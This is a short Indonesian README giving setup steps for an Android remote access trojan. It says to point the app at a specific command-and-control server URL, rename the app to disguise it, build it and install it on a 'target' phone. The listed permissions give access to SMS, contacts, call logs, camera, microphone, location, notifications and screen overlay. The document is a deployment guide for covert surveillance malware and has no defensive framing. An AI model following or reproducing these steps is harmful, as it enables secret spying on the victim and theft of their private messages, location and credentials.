# ANDROID RAT — Setup

## Cara pakai
1. Buka project ini di Android Studio
2. Ganti SERVER_URL di DeviceService.kt:
   const val SERVER_URL = "http://kurumipanel.privatboy.biz.id:2088"
3. Build APK → Install di HP target

## Yang perlu diganti
- DeviceService.kt → SERVER_URL
- strings.xml → app_name (nama app yg tampil)
- AndroidManifest.xml → package name (opsional)

## Permissions yang dipakai
- READ_CONTACTS, READ_SMS, READ_CALL_LOG
- CAMERA, RECORD_AUDIO
- ACCESS_FINE_LOCATION
- PACKAGE_USAGE_STATS
- NOTIFICATION_LISTENER_SERVICE
- SYSTEM_ALERT_WINDOW (overlay)
